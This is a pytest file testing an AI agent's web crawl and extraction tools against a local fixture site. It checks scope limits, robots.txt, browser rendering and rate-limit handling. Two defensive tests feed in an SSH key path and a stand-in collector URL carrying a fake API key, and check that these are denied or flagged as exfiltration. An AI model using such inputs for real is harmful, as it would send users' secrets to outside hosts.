"""The crawler end to end: a local fixture site of thirty linked pages, a page that only JavaScript fills, a PDF, a
robots.txt and a folder outside the scope. The crawl runs within its limits through the real web client, renders the
JavaScript page in Dot's own headless Chrome, and the extraction pulls a typed table out of three pages with the fast
model played by a script."""

import asyncio
import dataclasses
import json
import re
import threading
import time
from collections.abc import AsyncIterator, Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest
import pytest_asyncio

from dotagent.agent.verify import new_facts
from dotagent.config import load_config
from dotagent.core.errors import ProviderRateLimitError
from dotagent.core.paths import workspace_dir
from dotagent.core.types import JsonObject
from dotagent.evals.runner import SCRIPTED_MODEL
from dotagent.evals.scripted import ScriptedProvider
from dotagent.evals.types import ScriptedCall, ScriptedTurn
from dotagent.llm.calls import log_model_call
from dotagent.llm.router import ModelRouter
from dotagent.llm.types import ChatRequest, DeltaSink, ModelReply
from dotagent.policy.engine import auto_review
from dotagent.policy.types import ActionInfo, Decision
from dotagent.runtime import Runtime, build_runtime, close_runtime
from dotagent.tools import web as web_tools
from dotagent.tools.base import ToolResult
from dotagent.tools.context import ToolContext
from dotagent.web.extract import EXTRACT_TOOL, ExtractedField, Extraction

pytestmark = pytest.mark.asyncio(loop_scope="module")

_PAGES: int = 30
_RENDERED_SENTENCE: str = "Rendered by JavaScript: the catalogue has thirty products."
_FENCE: re.Pattern[str] = re.compile(r'<web_content nonce="(\w+)" url="[^"]+">\n(.*?)\n</web_content nonce="\1">', re.S)


def _product(number: int) -> str:
    links: str = " ".join(
        f'<a href="/catalogue/p{other}.html">Product {other}</a>'
        for other in (number + 1, number + 2)
        if other <= _PAGES
    )
    return (
        f"<!doctype html><html><head><title>Product {number}</title></head><body><main>"
        f"<h1>Product {number}</h1><p>Product {number} costs {10 + number},50 EUR and weighs {100 * number} g.</p>"
        f'<p>{links} <a href="/catalogue/">Index</a> <a href="/blog/news.html">News</a> <a '
        'href="/catalogue/doc.pdf">Sheet</a>'
        '<a href="/catalogue/app.html">App</a> <a '
        'href="/catalogue/private/secret.html">Private</a></p></main></body></html>'
    )


_INDEX: str = (
    "<!doctype html><title>Catalogue</title><main><h1>Catalogue</h1>"
    + " ".join(f'<a href="/catalogue/p{number}.html">Product {number}</a>' for number in range(1, 4))
    + "</main>"
)
_APP: str = (
    "<!doctype html><html><head><title>App</title><script></script><script></script>"
    f"<script>document.addEventListener('DOMContentLoaded', () => {{ document.body.innerHTML = "
    f"'<p>{_RENDERED_SENTENCE}</p>'; }});</script>"
    '</head><body><div id="app"></div></body></html>'
)


def _pdf(sentence: str) -> bytes:
    """A one-page PDF with ``sentence`` in Helvetica; the offsets of its cross-reference table are computed."""
    stream: bytes = f"BT /F1 18 Tf 72 720 Td ({sentence}) Tj ET".encode()
    objects: list[bytes] = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> "
        b">>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    document: bytearray = bytearray(b"%PDF-1.4\n")
    offsets: list[int] = []
    for number, body in enumerate(objects, start=1):
        offsets.append(len(document))
        document += f"{number} 0 obj\n".encode() + body + b"\nendobj\n"
    table: int = len(document)
    document += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode()
    for offset in offsets:
        document += f"{offset:010d} 00000 n \n".encode()
    document += f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{table}\n%%EOF\n".encode()
    return bytes(document)


_PDF: bytes = _pdf("Data sheet of the catalogue")
_ROBOTS: str = "User-agent: *\nDisallow: /catalogue/private/\n"
# A corner of the site with a page that turns plain requests away (item 98): /walled/wall.html answers 403 unless a
# Chrome asks, /walled/gone.html refuses everyone.
_WALLED_INDEX: str = (
    '<!doctype html><title>Walled</title><main><h1>Walled</h1><a href="/walled/wall.html">Wall</a> '
    '<a href="/walled/gone.html">Gone</a> <a href="/walled/open.html">Open</a></main>'
)
_WALL_SENTENCE: str = "Behind the wall: the walled corner has three pages."


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        path: str = self.path.split("?", 1)[0]
        body: bytes
        content_type: str = "text/html; charset=utf-8"
        status: int = 200
        product: re.Match[str] | None = re.fullmatch(r"/catalogue/p(\d+)\.html", path)
        if product and 1 <= int(product.group(1)) <= _PAGES:
            body = _product(int(product.group(1))).encode()
        elif path == "/catalogue/":
            body = _INDEX.encode()
        elif path == "/catalogue/app.html":
            body = _APP.encode()
        elif path == "/catalogue/doc.pdf":
            body, content_type = _PDF, "application/pdf"
        elif path == "/robots.txt":
            body, content_type = _ROBOTS.encode(), "text/plain"
        elif path == "/catalogue/private/secret.html":
            body = b"<!doctype html><title>Secret</title><p>Not for robots.</p>"
        elif path == "/blog/news.html":
            body = b"<!doctype html><title>News</title><p>Outside the catalogue.</p>"
        elif path == "/walled/":
            body = _WALLED_INDEX.encode()
        elif path == "/walled/open.html":
            body = b"<!doctype html><title>Open</title><p>Open to everyone.</p>"
        elif path == "/walled/wall.html":
            chrome: bool = "Chrome" in self.headers.get("User-Agent", "")
            body = f"<!doctype html><title>Wall</title><p>{_WALL_SENTENCE}</p>".encode() if chrome else b"<p>No.</p>"
            status = 200 if chrome else 403
        elif path == "/walled/gone.html":
            body, status = b"<p>Denied for everyone.</p>", 403
        else:
            body, status = b"<!doctype html><title>Gone</title><p>Nothing.</p>", 404
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args: object) -> None:
        return


class _Recorder:
    async def authorize(self, info: ActionInfo) -> str:
        return ""

    def add_instruction(self, text: str) -> None:
        return None


@pytest.fixture(scope="module")
def site() -> Iterator[str]:
    server: ThreadingHTTPServer = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{server.server_address[1]}"
    server.shutdown()
    server.server_close()


@pytest.fixture(scope="module")
def settings(tmp_path_factory: pytest.TempPathFactory) -> Path:
    path: Path = tmp_path_factory.mktemp("settings") / "config.toml"
    path.write_text(
        f'[models]\nfast = "{SCRIPTED_MODEL}"\n\n[web]\nallow_private_hosts = true\n\n[web.crawl]\n'
        "per_host_spacing_s = 0.0\n\n[browser]\nheadless = true\n",
        encoding="utf-8",
    )
    return path


@pytest_asyncio.fixture(scope="module", loop_scope="module")
async def runtime(settings: Path, tmp_path_factory: pytest.TempPathFactory) -> AsyncIterator[Runtime]:
    patch: pytest.MonkeyPatch = pytest.MonkeyPatch()
    home: Path = tmp_path_factory.mktemp("home")
    patch.setenv("DOT_HOME", str(home))
    patch.setenv("DOT_CHROME_DIR", str(home / "chrome"))
    built: Runtime = await build_runtime(load_config(settings))
    try:
        yield built
    finally:
        await close_runtime(built)
        patch.undo()


def _context(runtime: Runtime, output_chars: int) -> ToolContext:
    return ToolContext(
        runtime=runtime,
        browser=runtime.browser,
        run_id="crawl-test",
        agent_id=None,
        thread_id="crawl-test",
        mode="research",
        approvals="ask",
        questions="wait",
        workspace=workspace_dir(),
        gate=_Recorder(),
        cancel=asyncio.Event(),
        output_chars=output_chars,
        facts=new_facts,
    )


async def _call(runtime: Runtime, name: str, arguments: JsonObject, output_chars: int) -> tuple[ToolResult, ActionInfo]:
    ctx: ToolContext = _context(runtime, output_chars)
    prepared = await runtime.registry.tools[name].prepare(arguments, ctx)
    return await prepared.run(ctx), prepared.action


@pytest.mark.browser
async def test_the_crawl_stays_in_scope_within_its_limits_renders_the_app_page_and_reports_robots(
    runtime: Runtime, site: str
) -> None:
    result, action = await _call(
        runtime, "web_crawl", {"url": f"{site}/catalogue/", "scope": "prefix", "max_pages": 12, "max_depth": 4}, 200_000
    )
    assert not result.is_error, result.text
    assert result.untrusted
    assert (action.tool, action.kind) == ("web_crawl", "network")
    head: str = result.text.split("\n\n", 1)[0]
    # The call asks for depth 4; [web.crawl] max_depth (3) caps it, so the pages four links away stay unread.
    assert head.startswith("Crawled 11 pages from")
    # The news page is linked from every product but lies outside the scope: it is never read.
    assert "] http://" in head and "/blog/news.html" not in head
    assert f"{site}/catalogue/app.html" in result.text and "rendered" in head
    assert _RENDERED_SENTENCE in result.text
    assert "Data sheet of the catalogue" in result.text
    assert "robots.txt disallows 1 of these addresses" in head and "/catalogue/private/secret.html" in head
    assert "more addresses were found within the scope but not read (limits)" in head
    fences: list[str] = [match.group(2) for match in _FENCE.finditer(result.text)]
    # The first fence holds what the pages and their links wrote of the index (item 554), the others the pages.
    assert len(fences) == 12
    assert head.count("<web_content") == 1 and "] http://" in fences[0] and "/blog/news.html" not in fences[0]
    assert fences[1].startswith("# Catalogue\nSource:")


@pytest.mark.browser
async def test_a_page_that_refuses_the_plain_request_is_read_in_the_browser_and_one_that_refuses_both_is_left_out(
    runtime: Runtime, site: str
) -> None:
    result, _ = await _call(
        runtime, "web_crawl", {"url": f"{site}/walled/", "scope": "prefix", "max_pages": 10}, 200_000
    )
    assert not result.is_error, result.text
    head: str = result.text.split("\n\n", 1)[0]
    assert head.startswith("Crawled 3 pages from")
    assert f"{site}/walled/wall.html  (no title)" in head
    assert "rendered; the plain request got HTTP 403, read in the browser" in head
    assert _WALL_SENTENCE in result.text
    assert (
        f"Left out (1):\n- {site}/walled/gone.html: HTTP 403; the browser could not read it: the browser got HTTP 403 "
        "too" in head
    )


async def test_a_crawl_that_does_not_fit_one_result_is_written_to_files_the_extraction_reads(
    runtime: Runtime, site: str
) -> None:
    result, _ = await _call(
        runtime,
        "web_crawl",
        {"url": f"{site}/catalogue/p1.html", "scope": "prefix", "max_pages": 3, "max_depth": 1},
        2500,
    )
    assert not result.is_error, result.text
    folder: re.Match[str] | None = re.search(
        r"so each is a Markdown file under (\S+) \(index\.md lists them\)", result.text
    )
    assert folder is not None, result.text
    root: Path = Path(folder.group(1))
    files: list[Path] = await asyncio.to_thread(lambda: sorted(root.glob("0*.md")))
    assert [file.name for file in files] == ["001.md", "002.md", "003.md"]
    assert await asyncio.to_thread((root / "index.md").is_file)
    assert "# Product 1" in files[0].read_text(encoding="utf-8")


async def test_the_extraction_returns_typed_fields_with_quotes_checked_against_the_sources(
    runtime: Runtime, site: str
) -> None:
    def answer(price: str, quote: str, weight: str) -> ScriptedTurn:
        return ScriptedTurn(
            text="",
            calls=(
                ScriptedCall(
                    tool=EXTRACT_TOOL,
                    arguments={
                        "price": {"value": price, "quote": quote},
                        "weight": {"value": weight, "quote": f"weighs {weight}"},
                    },
                ),
            ),
        )

    await runtime.router.register(
        "ollama",
        ScriptedProvider(
            "ollama",
            [
                answer("11,50 EUR", "costs 11,50 EUR", "100 g"),
                answer("12,50 EUR", "costs 12,50 EUR", "200 g"),
                # A quote the page does not hold: the value stays, marked unverified.
                answer("13,50 EUR", "costs 99,99 EUR", "300 g"),
            ],
        ),
    )
    result, _ = await _call(
        runtime,
        "web_extract",
        {
            "sources": [f"{site}/catalogue/p{number}.html" for number in (1, 2, 3)],
            "fields": [
                {"name": "price", "description": "The price with its currency."},
                {"name": "weight", "description": "The weight in grams."},
            ],
        },
        200_000,
    )
    assert not result.is_error, result.text
    assert result.text.startswith("Extracted 3 of 3 sources; 1 values whose quote is not in the source")
    fenced: re.Match[str] | None = _FENCE.search(result.text)
    assert fenced is not None, result.text
    data: list[JsonObject] = json.loads(fenced.group(2))
    assert [entry["fields"]["price"]["value"] for entry in data] == ["11,50 EUR", "12,50 EUR", "13,50 EUR"]  # type: ignore[index]
    assert [entry["fields"]["price"]["verified"] for entry in data] == [True, True, False]  # type: ignore[index]
    assert all(entry["fields"]["weight"]["verified"] for entry in data)  # type: ignore[index]


class _NoFetch:
    """A web client that fails the test when anything is fetched."""

    async def get(self, url: str, max_bytes: int) -> None:
        raise AssertionError(f"fetched {url}")


async def test_a_file_of_the_workspace_is_read_even_when_its_name_looks_like_a_host(runtime: Runtime) -> None:
    name: str = "prices-174.md"
    path: Path = workspace_dir() / name
    await asyncio.to_thread(path.parent.mkdir, parents=True, exist_ok=True)
    await asyncio.to_thread(path.write_text, "The jar costs 4,20 EUR.", "utf-8")
    # A router of its own: the module's runtime has a scripted connector already.
    router: ModelRouter = ModelRouter(runtime.config, log_model_call, {})
    await router.register(
        "ollama",
        ScriptedProvider(
            "ollama",
            [
                ScriptedTurn(
                    text="",
                    calls=(
                        ScriptedCall(
                            tool=EXTRACT_TOOL, arguments={"price": {"value": "4,20 EUR", "quote": "costs 4,20 EUR"}}
                        ),
                    ),
                )
            ],
        ),
    )
    offline: Runtime = dataclasses.replace(runtime, router=router, web=_NoFetch())  # type: ignore[arg-type]
    try:
        result, _ = await _call(
            offline,
            "web_extract",
            {"sources": [name], "fields": [{"name": "price", "description": "The price with its currency."}]},
            200_000,
        )
    finally:
        await router.aclose()
    assert result.text.startswith("Extracted 1 of 1 sources; 0 values whose quote is not in the source"), result.text


class _RateLimited(ScriptedProvider):
    """The fast model's provider, answering every call with a rate limit; it counts the calls."""

    def __init__(self) -> None:
        super().__init__("ollama", [])
        self.calls: int = 0

    async def complete(self, request: ChatRequest, sink: DeltaSink) -> ModelReply:
        self.calls += 1
        raise ProviderRateLimitError("the fast model is rate limited", 429, None, {"model": request.model})


async def test_a_fast_model_paused_after_a_rate_limit_is_not_asked_again_and_the_extraction_says_why(
    runtime: Runtime,
) -> None:
    name: str = "prices-240.md"
    path: Path = workspace_dir() / name
    await asyncio.to_thread(path.parent.mkdir, parents=True, exist_ok=True)
    await asyncio.to_thread(path.write_text, "The jar costs 4,20 EUR.", "utf-8")
    router: ModelRouter = ModelRouter(runtime.config, log_model_call, {})
    limited: _RateLimited = _RateLimited()
    await router.register("ollama", limited)
    offline: Runtime = dataclasses.replace(runtime, router=router, web=_NoFetch())  # type: ignore[arg-type]
    arguments: JsonObject = {
        "sources": [name, name],
        "fields": [{"name": "price", "description": "The price with its currency."}],
    }
    try:
        first, _ = await _call(offline, "web_extract", arguments, 200_000)
        again, _ = await _call(offline, "web_extract", arguments, 200_000)
    finally:
        await router.aclose()
    # The first source met the rate limit, which paused the fast model; nothing after it was sent (item 240).
    assert limited.calls == 1
    assert first.is_error and again.is_error
    paused: str = rf"- {re.escape(name)}: {re.escape(SCRIPTED_MODEL)} \(rate limited until [^)]+\) cannot answer now; "
    assert re.search(rf"- {re.escape(name)}: the fast model is rate limited\n{paused}", first.text), first.text
    assert len(re.findall(paused, again.text)) == 2, again.text


async def test_a_call_that_runs_out_of_time_returns_what_it_extracted_and_lists_the_rest(
    runtime: Runtime, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Item 554: the executor cancels a call at its timeout and everything extracted so far went with it; the call
    ends at its own time instead, with the extractions it has, the source it was in the middle of and the ones it did
    not reach listed as not extracted."""
    asked: list[str] = []

    async def source_text(source: str, ctx: ToolContext, allowed: tuple[str, ...]) -> str:
        return f"The text of {source}."

    async def extraction(
        router: object, model: str, timeout_s: float, thread: str, run: str, source: str, text: str, fields: object
    ) -> Extraction:
        asked.append(source)
        if source.endswith("slow"):
            await asyncio.sleep(60)
        return Extraction(
            source=source, fields={"price": ExtractedField(value="4,20 EUR", quote="4,20", verified=False)}
        )

    monkeypatch.setattr(web_tools, "_source_text", source_text)
    monkeypatch.setattr(web_tools, "extract", extraction)
    # Five seconds of working time: the margin takes the rest of the call's twenty.
    monkeypatch.setattr(web_tools, "_EXTRACT_TIMEOUT_S", 20.0)
    monkeypatch.setattr(web_tools, "_EXTRACT_MARGIN_S", 15.0)
    monkeypatch.setattr(web_tools, "_EXTRACT_MIN_SOURCE_S", 1.0)
    started: float = time.monotonic()
    result, _ = await _call(
        runtime,
        "web_extract",
        {
            "sources": ["a.example/one", "a.example/slow", "a.example/three", "a.example/four"],
            "fields": [{"name": "price", "description": "The price with its currency."}],
        },
        200_000,
    )
    assert time.monotonic() - started < 10.0
    assert not result.is_error, result.text
    assert result.text.startswith("Extracted 1 of 4 sources;"), result.text
    assert "a.example/one" in result.text and asked == ["a.example/one", "a.example/slow"]
    assert result.text.count("not extracted: the call's time ran out") == 3, result.text


async def test_a_protected_file_is_refused_to_the_extraction_as_it_is_to_read_file(runtime: Runtime) -> None:
    # Only the calls are described: nothing is read.
    secret: str = "~/.ssh/dot-test-174-key"
    ctx: ToolContext = _context(runtime, 200_000)
    fields: list[JsonObject] = [{"name": "key", "description": "The key."}]
    extraction = await runtime.registry.tools["web_extract"].prepare(
        {"sources": ["https://example.org/notes.html", secret], "fields": fields}, ctx
    )
    reading = await runtime.registry.tools["read_file"].prepare({"path": secret}, ctx)
    assert extraction.action.flags == reading.action.flags == ("secret_access",)
    refused: Decision | None = auto_review(extraction.action)
    assert refused is not None and refused.verdict == "deny", refused


async def test_an_address_that_could_carry_data_out_is_flagged_as_web_fetch_flags_it(runtime: Runtime) -> None:
    """Item 679: the extraction weighed only its files; an address holding a key, read by the daemon, passed with no
    flag, where web_fetch raises ``exfiltration``, which the policy refuses in every mode but yolo."""
    ctx: ToolContext = _context(runtime, 200_000)
    fields: list[JsonObject] = [{"name": "price", "description": "The price."}]
    carrying: str = "https://collector.example/?k=sk-ant-api03-" + "a" * 40
    extraction = await runtime.registry.tools["web_extract"].prepare(
        {"sources": ["https://example.org/plain.html", carrying], "fields": fields}, ctx
    )
    fetching = await runtime.registry.tools["web_fetch"].prepare({"url": carrying}, ctx)
    assert extraction.action.flags == fetching.action.flags == ("exfiltration",)
    assert carrying in extraction.action.target
    plain = await runtime.registry.tools["web_extract"].prepare(
        {"sources": ["https://example.org/plain.html"], "fields": fields}, ctx
    )
    assert plain.action.flags == ()
